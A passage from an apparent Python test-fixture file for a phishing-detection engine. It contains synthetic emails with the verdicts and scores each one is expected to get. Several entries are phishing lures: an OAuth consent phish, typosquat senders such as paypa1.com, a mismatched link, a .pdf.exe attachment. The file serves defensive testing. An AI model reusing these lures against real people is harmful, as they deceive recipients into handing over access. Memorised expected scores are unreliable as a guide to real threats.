                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

MULTIPLE_RECIPIENTS_BCC = {
    "label": "Mass BCC — recipient is in BCC, not in To/CC headers (spam-like)",
    "tags": ["auth_fail"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="edge-008",
        sender_address="promo@unknown-store.xyz",
        recipient="user@example.com",
        subject="Exclusive deal just for you",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Congratulations! You've been selected for an exclusive offer.\n\n"
            "Visit our store: https://unknown-store.xyz/deal\n\n"
            "Unsubscribe: https://unknown-store.xyz/unsub"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "promo@unknown-store.xyz"},
            {"name": "To", "value": "undisclosed-recipients:;"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=unknown-store.xyz; "
                "dkim=none; dmarc=fail header.from=unknown-store.xyz"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  10. SPECIAL CATEGORIES
# ═══════════════════════════════════════════════════════════════════════════

# Note: a "callback phishing" fixture (Geek Squad / phone-number scam, no link
# / no HTML form / no attachment / no cousin domain — only weak `none` auth
# results and a phone number in the body) was removed from this corpus. The
# deterministic analyzers genuinely have nothing to flag in that pattern; it
# is the use case the LanguageAssessmentAnalyzer was added to cover, and a
# tier-1 fixture asserting SUSPICIOUS/LIKELY_MALICIOUS without that analyzer
# wired in could only ever assert a false expectation. If the language
# analyzer is enabled in a future tier-3 fixture sweep, restore the example
# there.

CREDENTIAL_PHISH_OAUTH = {
    "label": "OAuth consent phishing — asks to grant app permissions, not credentials directly",
    "tags": ["spoofed_sender", "credential_ask", "auth_fail"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="special-003",
        sender_address="security@docs-google-verify.com",
        sender_display_name="Google Docs Team",
        recipient="user@example.com",
        subject="Important: review document shared with you",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "A document has been shared with you via Google Docs.\n\n"
            "To view the document, you need to authorize the app:\n"
            "https://docs-google-verify.com/oauth/consent?scope=drive,gmail\n\n"
            "This authorization is required for security purposes.\n\n"
            "Google Docs Team"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "security@docs-google-verify.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=docs-google-verify.com; "
                "dkim=pass header.d=docs-google-verify.com; "
                "dmarc=pass header.from=docs-google-verify.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  11. SIMPLE SMOKE CHECKS — bare-minimum SAFE inputs
#       Purpose: verify the engine returns SAFE on inputs that exercise zero
#       analyzers. Useful as quick sanity tests before any rule change.
# ═══════════════════════════════════════════════════════════════════════════

SIMPLE_PLAIN_TEXT_HELLO = {
    "label": "Smoke — bare two-line email, no headers, no html",
    "tags": ["smoke", "legitimate", "empty_body"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-001",
        sender_address="someone@example.com",
        recipient="user@example.com",
        subject="Hi",
        body_text="Hey, just checking in. Talk later.",
    ),
}

SIMPLE_AUTH_PASS_TRANSACTIONAL = {
    "label": "Smoke — auth pass, plain receipt, no signals",
    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-002",
        sender_address="receipts@stripe.com",
        recipient="customer@example.com",
        subject="Receipt for your payment",
        body_text=(
            "Thanks for your payment of $19.99 on May 1, 2026.\n"
            "Reference: pi_3MZ8pH2eZvKYlo2C0vJqXqX9\n"
            "View receipt at https://dashboard.stripe.com/receipts/abc"
        ),
        headers=[
            {"name": "From", "value": "receipts@stripe.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=stripe.com; "
                "dkim=pass header.d=stripe.com; dmarc=pass header.from=stripe.com"
            )},
        ],
    ),
}

SIMPLE_INTERNAL_REPLY = {
    "label": "Smoke — colleague reply on same domain, auth pass",
    "tags": ["smoke", "legitimate", "internal", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-003",
        sender_address="bob@targetcorp.com",
        recipient="alice@targetcorp.com",
        subject="Re: lunch",
        body_text="Sure — see you at noon.",
        headers=[
            {"name": "From", "value": "bob@targetcorp.com"},
            {"name": "In-Reply-To", "value": "<thread-1@targetcorp.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
    ),
}

SIMPLE_LINKEDIN_NOTIFICATION = {
    "label": "Smoke — LinkedIn connection notification, valid auth",
    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-004",
        sender_address="messages-noreply@linkedin.com",
        recipient="user@example.com",
        subject="You have a new connection request",
        body_text=(
            "Carla Mendez wants to connect on LinkedIn.\n"
            "View profile: https://www.linkedin.com/in/carla-mendez-5678"
        ),
        headers=[
            {"name": "From", "value": "LinkedIn <messages-noreply@linkedin.com>"},
            {"name": "List-Unsubscribe", "value": "<https://www.linkedin.com/comm/unsub>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=linkedin.com; "
                "dkim=pass header.d=linkedin.com; dmarc=pass header.from=linkedin.com"
            )},
        ],
    ),
}

SIMPLE_DOCUSIGN_REQUEST = {
    "label": "Smoke — DocuSign signature request from real domain",
    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-005",
        sender_address="dse_NA4@docusign.net",
        recipient="signer@example.com",
        subject="Please DocuSign: NDA - Vendor Agreement",
        body_text=(
            "Carla has sent you a document to review and sign.\n"
            "Review document: https://app.docusign.com/documents/abc123"
        ),
        headers=[
            {"name": "From", "value": "DocuSign EU <dse_NA4@docusign.net>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=docusign.net; "
                "dkim=pass header.d=docusign.net; dmarc=pass header.from=docusign.net"
            )},
        ],
    ),
}

SIMPLE_CALENDAR_REMINDER = {
    "label": "Smoke — Google Calendar reminder, internal recipient",
    "tags": ["smoke", "legitimate", "calendar", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-006",
        sender_address="calendar-notification@google.com",
        recipient="user@targetcorp.com",
        subject="Reminder: Standup at 10:00 AM",
        body_text="Reminder: Standup tomorrow at 10:00 AM. Conference Room A.",
        headers=[
            {"name": "From", "value": "Google Calendar <calendar-notification@google.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=google.com; "
                "dkim=pass header.d=google.com; dmarc=pass header.from=google.com"
            )},
        ],
    ),
}

SIMPLE_PR_MERGE_NOTIFICATION = {
    "label": "Smoke — GitHub PR merged notification",
    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-007",
        sender_address="notifications@github.com",
        recipient="developer@example.com",
        subject="[myorg/myrepo] Pull request #401 merged",
        body_text=(
            "Pull request #401 'Refactor scoring tier thresholds' "
            "has been merged into main."
        ),
        headers=[
            {"name": "From", "value": "GitHub <notifications@github.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=github.com; "
                "dkim=pass header.d=github.com; dmarc=pass header.from=github.com"
            )},
        ],
    ),
}

SIMPLE_AWS_BILLING_RECEIPT = {
    "label": "Smoke — AWS billing receipt, plain text",
    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-008",
        sender_address="billing@amazonaws.com",
        recipient="finance@example.com",
        subject="Your AWS bill for April 2026",
        body_text=(
            "Your AWS bill for April 2026 is $124.83.\n"
            "Manage billing at https://console.aws.amazon.com/billing/"
        ),
        headers=[
            {"name": "From", "value": "billing@amazonaws.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=amazonses.com; "
                "dkim=pass header.d=amazon.com; dmarc=pass header.from=amazonaws.com"
            )},
        ],
    ),
}

SIMPLE_SHORT_HTML_NEWSLETTER = {
    "label": "Smoke — short HTML newsletter, valid ESP, no signals",
    "tags": ["smoke", "legitimate", "newsletter", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-009",
        sender_address="news@bigshop.example.com",
        recipient="reader@example.com",
        subject="3 picks for you this week",
        body_text="Top picks: cookware, towels, planters.",
        body_html=(
            "<html><body>"
            "<h2>3 picks for you</h2>"
            "<ul><li>Cookware</li><li>Towels</li><li>Planters</li></ul>"
            '<p><a href="https://bigshop.example.com/picks">Browse picks</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "BigShop <news@bigshop.example.com>"},
            {"name": "List-Unsubscribe", "value": "<https://bigshop.example.com/unsub>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=sendgrid.net; "
                "dkim=pass header.d=bigshop.example.com; dmarc=pass header.from=bigshop.example.com"
            )},
        ],
        return_path_address="bounce@em.sendgrid.net",
    ),
}

SIMPLE_TWO_LINE_AUTOREPLY = {
    "label": "Smoke — out-of-office autoreply, freemail, no display name",
    "tags": ["smoke", "legitimate", "freemail", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="smoke-010",
        sender_address="contact@gmail.com",
        recipient="someone@example.com",
        subject="Out of office",
        body_text="I am away until May 10. Will respond when I am back.",
        headers=[
            {"name": "From", "value": "contact@gmail.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  12. ANALYZER ISOLATION — single-signal fixtures, one analyzer at a time
#       Each fixture isolates ONE analyzer's output so per-analyzer changes
#       can be validated without crosstalk.
# ═══════════════════════════════════════════════════════════════════════════

# ----- Authentication isolation -----

AUTH_DMARC_FAIL_ONLY = {
    "label": "Auth isolation — DMARC fail, otherwise clean (single CRITICAL → 35)",
    "tags": ["auth_fail", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 35,
        "max_score": 50,
    },
    "email": _email(
        message_id="auth-iso-001",
        sender_address="ops@reliable-vendor.example",
        recipient="customer@example.com",
        subject="Monthly status update",
        body_text="Hi, here is our monthly status. Nothing notable. Thanks.",
        headers=[
            {"name": "From", "value": "ops@reliable-vendor.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=reliable-vendor.example; "
                "dkim=pass header.d=reliable-vendor.example; "
                "dmarc=fail header.from=reliable-vendor.example"
            )},
        ],
    ),
}

AUTH_SPF_SOFTFAIL_ONLY = {
    "label": "Auth isolation — SPF softfail only (HIGH×0.7 → ~15 pts SUSPICIOUS)",
    "tags": ["auth_fail", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="auth-iso-002",
        sender_address="updates@small-vendor.example",
        recipient="user@example.com",
        subject="Schedule update",
        body_text="Heads up — we are pushing the schedule by a day.",
        headers=[
            {"name": "From", "value": "updates@small-vendor.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=small-vendor.example; "
                "dkim=pass header.d=small-vendor.example; "
                "dmarc=pass header.from=small-vendor.example"
            )},
        ],
    ),
}

AUTH_SPF_NONE_BLINDSPOT = {
    "label": "Auth isolation — SPF=none (blind spot + LOW signal, expect SAFE)",
    "tags": ["auth_blindspot", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="auth-iso-003",
        sender_address="info@quiet-corp.example",
        recipient="reader@example.com",
        subject="Hello",
        body_text="Just saying hi from the team.",
        headers=[
            {"name": "From", "value": "info@quiet-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=none smtp.mailfrom=quiet-corp.example; "
                "dkim=pass header.d=quiet-corp.example; dmarc=pass header.from=quiet-corp.example"
            )},
        ],
    ),
}

AUTH_TEMPERROR_BLINDSPOT_ONLY = {
    "label": "Auth isolation — DKIM=temperror (blind spot only, no signal)",
    "tags": ["auth_blindspot", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="auth-iso-004",
        sender_address="alerts@niche-saas.example",
        recipient="ops@example.com",
        subject="Daily metric digest",
        body_text="Today: 12,344 events, 0 errors.",
        headers=[
            {"name": "From", "value": "alerts@niche-saas.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=niche-saas.example; "
                "dkim=temperror header.d=niche-saas.example; "
                "dmarc=pass header.from=niche-saas.example"
            )},
        ],
    ),
}

AUTH_NO_HEADERS_BLINDSPOT = {
    "label": "Auth isolation — no Authentication-Results header (pure blind spot)",
    "tags": ["auth_blindspot", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="auth-iso-005",
        sender_address="someone@example.com",
        recipient="other@example.com",
        subject="Quick note",
        body_text="Quick note — see you Monday.",
        headers=[
            {"name": "From", "value": "someone@example.com"},
            {"name": "To", "value": "other@example.com"},
        ],
    ),
}

AUTH_DKIM_FAIL_ONLY = {
    "label": "Auth isolation — DKIM fail only (HIGH/1.0 → 22 SUSPICIOUS)",
    "tags": ["auth_fail", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="auth-iso-006",
        sender_address="news@medium-corp.example",
        recipient="reader@example.com",
        subject="This week in tech",
        body_text="Highlights: AI, robotics, climate.",
        headers=[
            {"name": "From", "value": "news@medium-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=medium-corp.example; "
                "dkim=fail header.d=medium-corp.example; "
                "dmarc=pass header.from=medium-corp.example"
            )},
        ],
    ),
}


# ----- URL structure isolation -----

URL_IP_LITERAL_ONLY = {
    "label": "URL isolation — single IP-literal link, otherwise clean",
    "tags": ["ip_url", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="url-iso-001",
        sender_address="updates@news.example.com",
        recipient="reader@example.com",
        subject="Daily digest",
        body_text=(
            "Today's digest is available.\n"
            "Read it: http://203.0.113.42/digest\n"
        ),
        headers=[
            {"name": "From", "value": "updates@news.example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=news.example.com; "
                "dkim=pass header.d=news.example.com; dmarc=pass header.from=news.example.com"
            )},
        ],
    ),
}

URL_HREF_TEXT_MISMATCH_ONLY = {
    "label": "URL isolation — display text vs href domain mismatch (CRITICAL → 35)",
    "tags": ["url_mismatch", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 35,
        "max_score": 50,
    },
    "email": _email(
        message_id="url-iso-002",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject="Daily news",
        body_html=(
            "<html><body>"
            "<p>Read today's lead story:</p>"
            '<p><a href="https://entirely-different-host.example/track">'
            "https://www.bbc.co.uk/news</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}

URL_BARE_PLAIN_LINK_CLEAN = {
    "label": "URL isolation — bare plain-text URL, no signals",
    "tags": ["legitimate", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="url-iso-003",
        sender_address="docs@docs.example.com",
        recipient="reader@example.com",
        subject="Doc shared",
        body_text="See: https://docs.example.com/q2-plan",
        headers=[
            {"name": "From", "value": "docs@docs.example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=docs.example.com; "
                "dkim=pass header.d=docs.example.com; dmarc=pass header.from=docs.example.com"
            )},
        ],
    ),
}

URL_HREF_MATCHING_DISPLAY_CLEAN = {
    "label": "URL isolation — href domain matches display text, no signal",
    "tags": ["legitimate", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="url-iso-004",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject="Read more",
        body_html=(
            "<html><body>"
            '<p><a href="https://trusted-news.example/article/42">'
            "https://trusted-news.example/article/42</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}


# ----- Sender identity isolation -----

SENDER_REPLY_TO_MISMATCH_ONLY = {
    "label": "Sender isolation — Reply-To on different non-ESP domain (HIGH/1.0 → 22)",
    "tags": ["reply_to_mismatch", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="sender-iso-003",
        sender_address="info@vendor-corp.example",
        recipient="customer@example.com",
        subject="Updated terms",
        body_text="Our terms of service have been updated. No action needed.",
        headers=[
            {"name": "From", "value": "info@vendor-corp.example"},
            {"name": "Reply-To", "value": "real-payments@unrelated-host.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
                "dkim=pass header.d=vendor-corp.example; "
                "dmarc=pass header.from=vendor-corp.example"
            )},
        ],
        reply_to_address="real-payments@unrelated-host.example",
    ),
}

SENDER_RETURN_PATH_MISMATCH_ONLY = {
    "label": "Sender isolation — Return-Path on different non-ESP domain (MEDIUM×0.8)",
    "tags": ["return_path_mismatch", "isolation"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 14,
    },
    "email": _email(
        message_id="sender-iso-004",
        sender_address="info@vendor-corp.example",
        recipient="customer@example.com",
        subject="Welcome",
        body_text="Welcome to Vendor Corp.",
        headers=[
            {"name": "From", "value": "info@vendor-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
                "dkim=pass header.d=vendor-corp.example; "
                "dmarc=pass header.from=vendor-corp.example"
            )},
        ],
        return_path_address="bounce@unrelated-bounce.example",
    ),
}

SENDER_TYPOSQUAT_PAYPAL_ONLY = {
    "label": "Sender isolation — paypa1.com cousin domain (CRITICAL/1.0 → 35)",
    "tags": ["cousin_domain", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 30,
        "max_score": 50,
    },
    "email": _email(
        message_id="sender-iso-005",
        sender_address="hello@paypa1.com",
        recipient="customer@example.com",
        subject="Reminder",
        body_text="Just a friendly reminder.",
        headers=[
            {"name": "From", "value": "hello@paypa1.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=paypa1.com; "
                "dkim=pass header.d=paypa1.com; dmarc=pass header.from=paypa1.com"
            )},
        ],
    ),
}

SENDER_TYPOSQUAT_GOOGLE_ZERO = {
    "label": "Sender isolation — g00gle.com cousin (digit-substitution, CRITICAL)",
    "tags": ["cousin_domain", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 30,
        "max_score": 50,
    },
    "email": _email(
        message_id="sender-iso-006",
        sender_address="security@g00gle.com",
        recipient="user@example.com",
        subject="Notice",
        body_text="A new sign-in was recorded.",
        headers=[
            {"name": "From", "value": "security@g00gle.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=g00gle.com; "
                "dkim=pass header.d=g00gle.com; dmarc=pass header.from=g00gle.com"
            )},
        ],
    ),
}


# ----- Body content isolation -----

BODY_URGENCY_ONLY_LIGHT = {
    "label": "Body isolation — single urgency phrase only (MEDIUM×0.65 → 7.8 SAFE)",
    "tags": ["urgency", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="body-iso-001",
        sender_address="ops@regularco.example",
        recipient="oncall@example.com",
        subject="Heads up",
        body_text=(
            "Please respond immediately if you see anything off in the dashboard. "
            "Otherwise nothing else to report."
        ),
        headers=[
            {"name": "From", "value": "ops@regularco.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
            )},
        ],
    ),
}

BODY_URGENCY_ONLY_HEAVY = {
    "label": "Body isolation — many urgency phrases (MEDIUM×1.0 → 12 SAFE)",
    "tags": ["urgency", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="body-iso-002",
        sender_address="ops@regularco.example",
        recipient="oncall@example.com",
        subject="Status",
        body_text=(
            "Please respond immediately. This is time-sensitive. "
            "Within 24 hours we expect an update. Service interruption "
            "may occur. Immediate action required."
        ),
        headers=[
            {"name": "From", "value": "ops@regularco.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
            )},
        ],
    ),
}

BODY_SENSITIVE_REQUEST_ONLY = {
    "label": "Body isolation — 'verify your password' phrase only (language-only, deterministic SAFE)",
    "tags": ["credential_ask", "isolation", "language_only"],
    # Body-language detection moved to LanguageAssessmentAnalyzer.
    # Deterministic engine has no rule for "verify your password" phrasing
    # alone — this pattern is only caught when the language analyzer is wired in.
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="body-iso-003",
        sender_address="account@vendor-corp.example",
        recipient="customer@example.com",
        subject="Account update",
        body_text=(
            "We need you to verify your password to keep your account in good standing. "
            "Thanks for being a customer."
        ),
        headers=[
            {"name": "From", "value": "account@vendor-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
                "dkim=pass header.d=vendor-corp.example; "
                "dmarc=pass header.from=vendor-corp.example"
            )},
        ],
    ),
}

BODY_HTML_FORM_ONLY = {
    "label": "Body isolation — single HTML form, otherwise clean (CRITICAL → 35)",
    "tags": ["html_form", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 35,
        "max_score": 50,
    },
    "email": _email(
        message_id="body-iso-004",
        sender_address="account@vendor-corp.example",
        recipient="customer@example.com",
        subject="Quick poll",
        body_html=(
            "<html><body>"
            "<p>Two-question poll:</p>"
            '<form action="https://vendor-corp.example/poll" method="POST">'
            '<input name="q1" type="text"><br>'
            '<input name="q2" type="text"><br>'
            '<input type="submit" value="Submit">'
            "</form>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "account@vendor-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
                "dkim=pass header.d=vendor-corp.example; "
                "dmarc=pass header.from=vendor-corp.example"
            )},
        ],
    ),
}


# ----- Attachment isolation -----

ATTACH_EXE_ONLY = {
    "label": "Attachment isolation — single .exe (CRITICAL×0.95 → 33.25)",
    "tags": ["attachment_exe", "isolation"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 25,
        "max_score": 50,
    },
    "email": _email(
        message_id="attach-iso-001",
        sender_address="builds@build-bot.example",
        recipient="dev@example.com",
        subject="Build artifact",
        body_text="Latest build attached.",
        headers=[
            {"name": "From", "value": "builds@build-bot.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=build-bot.example; "
                "dkim=pass header.d=build-bot.example; dmarc=pass header.from=build-bot.example"
            )},
        ],
        attachments=[
            {"filename": "installer.exe", "mime_type": "application/x-msdownload", "size_bytes": 524288},
        ],
    ),
}

ATTACH_DOUBLE_EXTENSION_ONLY = {
    "label": "Attachment isolation — .pdf.exe double extension (capped at 50)",
    "tags": ["attachment_exe", "isolation"],
    "expected": {
        "verdict": Verdict.LIKELY_MALICIOUS,
        "min_score": 35,
        "max_score": 55,
    },
    "email": _email(
        message_id="attach-iso-002",
        sender_address="invoicing@invoice-host.example",
        recipient="ap@example.com",
        subject="Statement",
        body_text="Statement attached.",
        headers=[
            {"name": "From", "value": "invoicing@invoice-host.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=invoice-host.example; "
                "dkim=pass header.d=invoice-host.example; "
                "dmarc=pass header.from=invoice-host.example"
            )},
        ],
        attachments=[
            {"filename": "statement.pdf.exe", "mime_type": "application/x-msdownload", "size_bytes": 102400},
        ],
    ),
}

ATTACH_MACRO_ONLY = {
    "label": "Attachment isolation — single .docm (HIGH×0.85 → 18.7)",
    "tags": ["attachment_macro", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="attach-iso-003",
        sender_address="hr@hr-corp.example",
        recipient="employee@example.com",
        subject="Employee handbook update",
        body_text="Updated handbook attached. Please review at your convenience.",
        headers=[
            {"name": "From", "value": "hr@hr-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=hr-corp.example; "
                "dkim=pass header.d=hr-corp.example; dmarc=pass header.from=hr-corp.example"
            )},
        ],
        attachments=[
            {"filename": "handbook_2026.docm", "mime_type": "application/vnd.ms-word.document.macroEnabled.12", "size_bytes": 81920},
        ],
    ),
}

ATTACH_PASSWORD_ZIP_ONLY = {
    "label": "Attachment isolation — zip + 'password' in body (HIGH×0.8 → 17.6)",
    "tags": ["attachment_archive", "isolation"],
    "expected": {
        "verdict": Verdict.SUSPICIOUS,
        "min_score": 15,
        "max_score": 34,
    },
    "email": _email(
        message_id="attach-iso-004",
        sender_address="documents@archive-corp.example",
        recipient="recipient@example.com",
        subject="Encrypted documents",
        body_text="Documents attached. Password: Files2026!",
        headers=[
            {"name": "From", "value": "documents@archive-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=archive-corp.example; "
                "dkim=pass header.d=archive-corp.example; "
                "dmarc=pass header.from=archive-corp.example"
            )},
        ],
        attachments=[
            {"filename": "documents.zip", "mime_type": "application/zip", "size_bytes": 65536},
        ],
    ),
}

ATTACH_BENIGN_PDF_CLEAN = {
    "label": "Attachment isolation — single benign PDF, no signal",
    "tags": ["legitimate", "attachment_safe", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="attach-iso-005",
        sender_address="reports@finance-team.example",
        recipient="cfo@example.com",
        subject="Q1 financial report",
        body_text="Q1 financials attached for your review.",
        headers=[
            {"name": "From", "value": "reports@finance-team.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=finance-team.example; "
                "dkim=pass header.d=finance-team.example; "
                "dmarc=pass header.from=finance-team.example"
            )},
        ],
        attachments=[
            {"filename": "q1_report.pdf", "mime_type": "application/pdf", "size_bytes": 1048576},
        ],
    ),
}

ATTACH_MULTIPLE_BENIGN_CLEAN = {
    "label": "Attachment isolation — several benign PDFs/images, no signal",
    "tags": ["legitimate", "attachment_safe", "isolation"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="attach-iso-006",
        sender_address="design@design-team.example",
        recipient="client@example.com",
        subject="Design mockups, round 2",
        body_text="Updated mockups attached. Let me know what you think.",
        headers=[
            {"name": "From", "value": "design@design-team.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=design-team.example; "
                "dkim=pass header.d=design-team.example; "
                "dmarc=pass header.from=design-team.example"
            )},
        ],
        attachments=[
            {"filename": "mockup_home.png", "mime_type": "image/png", "size_bytes": 524288},
            {"filename": "mockup_pricing.png", "mime_type": "image/png", "size_bytes": 491520},
            {"filename": "design_brief.pdf", "mime_type": "application/pdf", "size_bytes": 204800},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  13. CONVERGENCE / MULTI-CATEGORY MALICIOUS — cross-category boost in play
# ═══════════════════════════════════════════════════════════════════════════

MULTI_AUTH_PLUS_URL_MISMATCH = {
